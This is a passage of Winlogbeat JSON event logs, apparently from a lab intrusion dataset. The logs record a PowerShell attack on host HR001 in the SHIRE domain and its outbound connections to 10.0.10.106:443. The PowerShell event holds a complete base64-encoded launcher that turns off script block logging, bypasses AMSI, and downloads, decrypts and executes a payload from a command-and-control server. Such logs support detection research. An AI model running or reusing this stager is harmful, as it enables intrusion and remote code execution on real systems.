QAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n        Engine Version = 5.1.17763.316\n        Runspace ID = af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 69925\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\""},"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"message":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 9189b674-b66f-4ae4-af64-65d46d4e78e4\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n        Engine Version = 5.1.17763.316\n        Runspace ID = af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 69925\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","opcode":"To be used when operation is just executing a method","level":"Information","computer_name":"HR001.shire.com","record_number":"92787","thread_id":5812,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"source_name":"Microsoft-Windows-PowerShell","event_id":4103,"task":"Executing Pipeline","log_name":"Microsoft-Windows-PowerShell/Operational","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","type":"wineventlog","process_id":5172,"version":1,"activity_id":"{c93a7728-017f-0000-ae03-4aca7f01d501}"}
{"@timestamp":"2019-05-18T20:43:13.206Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"process_id":4,"thread_id":1288,"computer_name":"HR001.shire.com","event_data":{"RemoteMachineID":"S-1-0-0","Direction":"%%14593","FilterRTID":"67557","DestPort":"443","SourceAddress":"172.18.39.106","SourcePort":"53375","DestAddress":"10.0.10.106","Protocol":"6","RemoteUserID":"S-1-0-0","ProcessID":"5172","LayerName":"%%14611","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","LayerRTID":"48"},"event_id":5156,"host":{"name":"WECserver"},"type":"wineventlog","level":"Information","keywords":["Audit Success"],"message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t5172\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53375\n\tDestination Address:\t10.0.10.106\n\tDestination Port:\t\t443\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","log_name":"Security","source_name":"Microsoft-Windows-Security-Auditing","task":"Filtering Platform Connection","opcode":"Info","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"version":1,"record_number":"288253"}
{"@timestamp":"2019-05-18T20:43:13.566Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_data":{"SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e4","SourceHandleId":"0x8b0","SourceProcessId":"0xd94","TargetHandleId":"0x35bc","TargetProcessId":"0x4","SubjectUserSid":"S-1-5-20","SubjectUserName":"HR001$"},"log_name":"Security","record_number":"288254","level":"Information","type":"wineventlog","task":"Handle Manipulation","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"computer_name":"HR001.shire.com","source_name":"Microsoft-Windows-Security-Auditing","keywords":["Audit Success"],"event_id":4690,"thread_id":1288,"opcode":"Info","process_id":4,"message":"An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-20\n\tAccount Name:\t\tHR001$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E4\n\nSource Handle Information:\n\tSource Handle ID:\t0x8b0\n\tSource Process ID:\t0xd94\n\nNew Handle Information:\n\tTarget Handle ID:\t0x35bc\n\tTarget Process ID:\t0x4","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","host":{"name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:13.566Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"computer_name":"HR001.shire.com","process_id":4,"log_name":"Security","thread_id":1288,"record_number":"288255","event_id":4658,"level":"Information","opcode":"Info","host":{"name":"WECserver"},"type":"wineventlog","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","event_data":{"ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectUserSid":"S-1-5-20","SubjectUserName":"HR001$","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e4","ObjectServer":"Security","HandleId":"0x35bc","ProcessId":"0xd94"},"message":"The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-20\n\tAccount Name:\t\tHR001$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E4\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x35bc\n\nProcess Information:\n\tProcess ID:\t\t0xd94\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"source_name":"Microsoft-Windows-Security-Auditing","keywords":["Audit Success"],"task":"Registry"}
{"@timestamp":"2019-05-18T20:43:13.566Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"version":1,"message":"A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-20\n\tAccount Name:\t\tHR001$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E4\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\tHandle ID:\t\t0x8b0\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0xd94\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tQuery key value\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x1\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0","process_id":4,"source_name":"Microsoft-Windows-Security-Auditing","event_id":4656,"keywords":["Audit Success"],"event_data":{"SubjectUserName":"HR001$","AccessList":"%%4432\n\t\t\t\t","TransactionId":"{00000000-0000-0000-0000-000000000000}","ObjectType":"Key","SubjectLogonId":"0x3e4","ProcessId":"0xd94","SubjectDomainName":"SHIRE","SubjectUserSid":"S-1-5-20","HandleId":"0x8b0","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","ResourceAttributes":"-","AccessReason":"-","RestrictedSidCount":"0","ObjectServer":"Security","AccessMask":"0x1","PrivilegeList":"-","ProcessName":"C:\\Windows\\System32\\svchost.exe"},"level":"Information","log_name":"Security","task":"Registry","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","host":{"name":"WECserver"},"thread_id":1288,"opcode":"Info","type":"wineventlog","record_number":"288256","computer_name":"HR001.shire.com","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"}}
{"@timestamp":"2019-05-18T20:43:13.566Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"An attempt was made to access an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-20\n\tAccount Name:\t\tHR001$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E4\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\tHandle ID:\t\t0x8b0\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0xd94\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nAccess Request Information:\n\tAccesses:\t\tQuery key value\n\t\t\t\t\n\tAccess Mask:\t\t0x1","version":1,"level":"Information","source_name":"Microsoft-Windows-Security-Auditing","event_data":{"HandleId":"0x8b0","ProcessId":"0xd94","SubjectUserName":"HR001$","SubjectDomainName":"SHIRE","AccessList":"%%4432\n\t\t\t\t","SubjectLogonId":"0x3e4","ObjectType":"Key","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","AccessMask":"0x1","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectUserSid":"S-1-5-20","ObjectServer":"Security","ResourceAttributes":"-"},"record_number":"288257","thread_id":1288,"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","log_name":"Security","task":"Registry","keywords":["Audit Success"],"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"event_id":4663,"opcode":"Info","type":"wineventlog","computer_name":"HR001.shire.com","process_id":4}
{"@timestamp":"2019-05-18T20:43:13.566Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"process_id":4,"record_number":"288258","computer_name":"HR001.shire.com","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"event_id":4658,"type":"wineventlog","thread_id":1288,"source_name":"Microsoft-Windows-Security-Auditing","task":"Registry","level":"Information","log_name":"Security","event_data":{"ProcessId":"0xd94","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectUserSid":"S-1-5-20","SubjectUserName":"HR001$","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e4","ObjectServer":"Security","HandleId":"0x8b0"},"keywords":["Audit Success"],"message":"The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-20\n\tAccount Name:\t\tHR001$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E4\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x8b0\n\nProcess Information:\n\tProcess ID:\t\t0xd94\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe","opcode":"Info","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","host":{"name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:14.058Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"level":"Information","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","event_id":5156,"type":"wineventlog","thread_id":1288,"opcode":"Info","event_data":{"Protocol":"6","LayerName":"%%14611","RemoteMachineID":"S-1-0-0","SourcePort":"53376","DestAddress":"10.0.10.106","DestPort":"443","FilterRTID":"67557","LayerRTID":"48","Application":"\\device\\harddiskvolume2\\windows\\system32\\notepad.exe","Direction":"%%14593","ProcessID":"7924","SourceAddress":"172.18.39.106","RemoteUserID":"S-1-0-0"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"task":"Filtering Platform Connection","process_id":4,"computer_name":"HR001.shire.com","message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t7924\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\notepad.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53376\n\tDestination Address:\t10.0.10.106\n\tDestination Port:\t\t443\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","record_number":"288259","version":1,"source_name":"Microsoft-Windows-Security-Auditing","log_name":"Security","keywords":["Audit Success"]}
{"@timestamp":"2019-05-18T20:43:13.225Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"log_name":"Microsoft-Windows-Sysmon/Operational","event_data":{"EventType":"CreateKey","UtcTime":"2019-05-18 20:43:13.191","ProcessGuid":"{03ba39f5-4cfe-5ce0-0000-00103600c001}","ProcessId":"5172","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"},"thread_id":3144,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","computer_name":"HR001.shire.com","record_number":"2237802","opcode":"Info","level":"Information","message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-05-18 20:43:13.191\nProcessGuid: {03ba39f5-4cfe-5ce0-0000-00103600c001}\nProcessId: 5172\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","version":2,"type":"wineventlog","process_id":2440,"host":{"name":"WECserver"},"task":"Registry object added or deleted (rule: RegistryEvent)","source_name":"Microsoft-Windows-Sysmon","event_id":12,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"}}
{"@timestamp":"2019-05-18T20:43:14.058Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"log_name":"Microsoft-Windows-Sysmon/Operational","event_id":12,"version":2,"record_number":"2237803","opcode":"Info","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"level":"Information","process_id":2440,"host":{"name":"WECserver"},"source_name":"Microsoft-Windows-Sysmon","event_data":{"Image":"C:\\Windows\\system32\\notepad.exe","TargetObject":"HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventType":"CreateKey","UtcTime":"2019-05-18 20:43:14.050","ProcessGuid":"{03ba39f5-652c-5ce0-0000-0010760bff01}","ProcessId":"7924"},"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","type":"wineventlog","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"computer_name":"HR001.shire.com","thread_id":3144,"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-05-18 20:43:14.050\nProcessGuid: {03ba39f5-652c-5ce0-0000-0010760bff01}\nProcessId: 7924\nImage: C:\\Windows\\system32\\notepad.exe\nTargetObject: HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","task":"Registry object added or deleted (rule: RegistryEvent)"}
